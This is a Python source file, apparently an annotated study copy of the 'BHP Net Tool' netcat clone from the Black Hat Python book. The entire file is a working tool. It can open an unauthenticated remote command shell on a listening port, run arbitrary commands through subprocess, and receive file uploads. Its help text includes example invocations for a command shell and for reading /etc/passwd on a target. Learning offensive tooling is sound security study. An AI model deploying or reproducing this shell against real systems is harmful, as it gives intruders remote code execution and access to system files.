import argparse
import socket
import shlex
import subprocess # subprocess provides powerful process-creation inter-face that gives a number of ways to interact with client programs
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), # runs the command on local os and then returns the output from that command
                                     stderr=subprocess.STDOUT)
    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None): # initialise the NetCat object with args from command line and buffer
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create sock object
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
    def run(self):
        if self.args.listen:
            self.listen() # set up listener with listen method
        else:
            self.send() # send method

    def send(self):
        self.socket.connect((self.args.target, self.args.port)) # connect to the target and port
        if self.buffer:
            self.socket.send((self.buffer)) # send buffer

        try: # set up try catch block to manually close the connection with CTRL+C
            while True: # loop to receive data from the target
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096: # break the loop if there's no more data
                        break
                if response: # print the response
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode()) # pause to get interactive input then send that input to continue the loop
        except KeyboardInterrupt:
            print('User terminated.') # close the loop if keyboard interrupt
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port)) # bind the target
        self.socket.listen(5) 
        while True: # start listening on the loop
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,) # accept connection and start threading
            )
            client_thread.start()


    def handle(self, client_socket): # this function can either execute a command, upload a file, or start a shell
        if self.args.execute: 
            output = execute(self.args.execute)
            client_socket.send(output.encode()) # pass command to execute function and send output back to the socket

        elif self.args.upload:
            file_buffer = b''
            while True: # set up a loop to listen for content on the listening socket then receive data until no more data is coming in
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                     break
                
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
                
        elif self.args.command:
            cmd_buffer = b''
            while True: # if a shell is to be created, set up a loop, send a prompt then wait for a command string to come back
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser( # create a command line interface
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
            netcat.py -t 192.168.1.108 -p 5555 -e=\"cat /etc/passwd\" # execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
            netcat.py -t 192.168.1.108 -p 5555 # connect to server
        ''')) # help examples for users when they type --help
    parser.add_argument('-c', '--command', action='store_true', help='command shell') # specify how the program should behave
    parser.add_argument('-e', '--execute', help='execute specified command') #
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen: # if setting up a listener, invoke the NetCat object with empty buffer string
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()